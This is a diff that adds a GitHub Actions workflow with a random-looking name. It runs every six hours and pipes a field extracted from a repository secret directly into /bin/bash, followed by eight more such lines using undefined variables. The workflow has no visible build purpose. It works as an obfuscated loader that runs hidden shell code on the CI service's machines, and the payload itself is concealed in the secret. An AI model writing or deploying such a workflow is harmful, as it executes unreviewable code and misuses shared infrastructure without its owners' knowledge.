@@ -1,0 +1,24 @@
+name: taodingren6735
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taodingren6735
+        env:
+          as9: ${{ secrets.as9 }}
+        run: |
+          echo $as9 | jq -r .gx2 | /bin/bash
+          echo $mflv5 | jq -r .qg9 | /bin/bash
+          echo $wvw0 | jq -r .q7183 | /bin/bash
+          echo $sfel70975 | jq -r .jf8 | /bin/bash
+          echo $v362 | jq -r .k04 | /bin/bash
+          echo $eo6665 | jq -r .lwauw4 | /bin/bash
+          echo $cdpuh24 | jq -r .fwy80015 | /bin/bash
+          echo $mbbn90262 | jq -r .tsbk3 | /bin/bash
+          echo $whnr09249 | jq -r .dgrt9 | /bin/bash
+
